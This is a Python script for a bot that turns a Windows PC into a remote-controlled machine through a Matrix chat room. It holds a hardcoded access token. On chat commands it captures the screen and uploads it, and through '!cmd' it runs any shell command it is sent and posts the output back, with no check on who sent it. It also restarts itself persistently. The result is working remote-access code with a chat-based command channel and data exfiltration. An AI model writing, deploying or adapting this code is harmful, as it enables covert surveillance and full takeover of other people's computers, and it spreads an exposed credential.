import requests
import subprocess
import time
import os
import logging
from mss import mss
from datetime import datetime

ACCESS_TOKEN = "mct_6SNByYmWTBWRrspvYrVrJ9tEGfyFNq_c0MBd1"
ROOM_ID = "!oCVUgXhQCRpkGgwmSF:matrix.org"
IMG_PATH = r"C:\Users\Public\screenshot.png"
HEADERS = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
BASE = "https://matrix.org/_matrix/client/v3"
RETRY_DELAY = 5
BATCH_FILE = "next_batch.txt"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger(__name__)


def safe_request(method, url, extra_headers=None, **kwargs):
    kwargs.setdefault("timeout", 30)
    headers = {**HEADERS, **(extra_headers or {})}
    for attempt in range(5):
        try:
            r = requests.request(method, url, headers=headers, **kwargs)
            r.raise_for_status()
            return r
        except requests.exceptions.ConnectionError:
            log.warning(f"No internet. Retry {attempt+1}/5 in {RETRY_DELAY}s...")
        except requests.exceptions.Timeout:
            log.warning(f"Timeout. Retry {attempt+1}/5...")
        except requests.exceptions.HTTPError as e:
            log.error(f"HTTP error: {e}")
            return None
        except Exception as e:
            log.error(f"Unexpected error: {e}")
        time.sleep(RETRY_DELAY * (attempt + 1))
    log.error(f"Failed after 5 attempts: {url}")
    return None


def send_text(text):
    safe_request("POST", f"{BASE}/rooms/{ROOM_ID}/send/m.room.message", json={
        "msgtype": "m.text", "body": text
    })


def upload_and_send_image(path):
    try:
        with open(path, "rb") as f:
            r = safe_request("POST", "https://matrix.org/_matrix/media/v3/upload",
                             extra_headers={"Content-Type": "image/png"}, data=f)
        if not r:
            send_text("Failed to upload screenshot.")
            return
        uri = r.json().get("content_uri")
        if uri:
            safe_request("POST", f"{BASE}/rooms/{ROOM_ID}/send/m.room.message", json={
                "msgtype": "m.image", "body": "screenshot.png", "url": uri
            })
    except Exception as e:
        log.error(f"Image upload error: {e}")
        send_text(f"Screenshot error: {e}")


def take_screenshot():
    with mss() as sct:
        sct.shot(mon=1, output=IMG_PATH)


def save_batch(token):
    with open(BATCH_FILE, "w") as f:
        f.write(token)


def load_batch():
    if os.path.exists(BATCH_FILE):
        with open(BATCH_FILE, "r") as f:
            return f.read().strip()
    return None


def get_initial_sync():
    saved = load_batch()
    if saved:
        log.info("Resuming from saved sync token.")
        return saved
    while True:
        r = safe_request("GET", f"{BASE}/sync", params={"timeout": 0})
        if r:
            token = r.json().get("next_batch")
            save_batch(token)
            return token
        log.warning("Can't reach Matrix. Waiting...")
        time.sleep(RETRY_DELAY)


def sync(since):
    r = safe_request("GET", f"{BASE}/sync", params={"since": since, "timeout": 10000})
    if r:
        return r.json()
    return None


def handle_command(body, sender):
    body = body.strip()
    log.info(f"Command from {sender}: {body}")

    if body == "!send":
        try:
            take_screenshot()
            upload_and_send_image(IMG_PATH)
        except Exception as e:
            send_text(f"Screenshot failed: {e}")

    elif body.startswith("!cmd "):
        cmd = body[5:]
        try:
            output = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT,
                text=True, timeout=15
            )
            send_text(f"```\n{output[:3000]}\n```")
        except subprocess.TimeoutExpired:
            send_text("Command timed out.")
        except subprocess.CalledProcessError as e:
            send_text(f"```\n{e.output[:3000]}\n```")
        except Exception as e:
            send_text(f"Error: {e}")

    elif body == "!status":
        send_text(f"✅ Online as of {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    elif body == "!help":
        send_text(
            "Commands:\n"
            "!send — take and send screenshot\n"
            "!cmd <command> — run terminal command\n"
            "!status — check if bot is alive\n"
            "!help — show this message"
        )


def main():
    log.info("Bot starting up...")
    next_batch = get_initial_sync()
    send_text(f"✅ PC is online — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log.info("Connected and ready.")

    while True:
        try:
            data = sync(next_batch)
            if not data:
                log.warning("Sync failed, retrying...")
                time.sleep(RETRY_DELAY)
                continue

            next_batch = data.get("next_batch", next_batch)
            save_batch(next_batch)

            rooms = data.get("rooms", {}).get("join", {})
            room = rooms.get(ROOM_ID, {})
            events = room.get("timeline", {}).get("events", [])

            for event in events:
                if event.get("type") != "m.room.message":
                    continue
                content = event.get("content", {})
                if content.get("msgtype") != "m.text":
                    continue
                body = content.get("body", "").strip()
                sender = event.get("sender", "")
                log.info(f"{sender}: {body}")
                handle_command(body, sender)

        except Exception as e:
            log.error(f"Main loop error: {e}")
            time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            log.error(f"Fatal error, restarting in {RETRY_DELAY}s: {e}")
            time.sleep(RETRY_DELAY)